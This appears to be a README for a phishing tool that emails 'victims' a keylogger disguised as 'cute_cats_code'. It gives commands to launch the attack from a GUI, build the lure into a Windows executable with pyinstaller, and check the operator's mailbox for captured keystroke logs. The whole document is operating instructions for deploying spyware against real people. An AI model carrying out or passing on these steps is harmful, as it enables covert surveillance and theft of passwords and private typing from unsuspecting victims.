# Program Instructions

## Running the code

Execute the main.py file
`python3 main.py`

A gui window shows up. Enter the victims' valid mail and launch the attack.
Close the message box. 
Preview you test email inbox for the malicius email and file.

### N/B The executable file was created from a linux machine.
# WINDOWS
To create the .exe file.

Install the requirements.txt file then
run `.\pyinstaller --onefile -w 'cute_cats_code.py` from the powershell

#

For any missing package:
`pyinstaller --hidden-import 'package_name' --onefile 'cute_cats_code.py`

Change the filename on line 30 of `backend.py` to match the path to your `cute_cats_code.exe` file

### Timely check the mail for key stroke logs.